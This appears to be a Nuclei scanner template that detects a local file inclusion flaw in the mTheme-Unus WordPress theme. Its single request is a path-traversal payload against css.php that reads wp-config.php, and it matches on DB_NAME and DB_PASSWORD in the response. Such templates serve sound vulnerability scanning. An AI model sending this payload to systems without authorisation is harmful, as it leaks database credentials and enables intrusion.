id: mthemeunus-lfi
info:
  author: dhiyaneshDk
  description: The mTheme-Unus WordPress Theme was affected by a css.php Local File
    Inclusion security vulnerability.
  name: mTheme-Unus Theme - Local File Inclusion (LFI)
  reference:
  - https://wpscan.com/vulnerability/bc036ee3-9648-49db-ae52-3a58fdeb82eb
  - https://packetstormsecurity.com/files/133778/
  severity: high
  tags: wordpress,wp-theme,lfi,wordpress,mtheme
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - DB_NAME
    - DB_PASSWORD
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php'
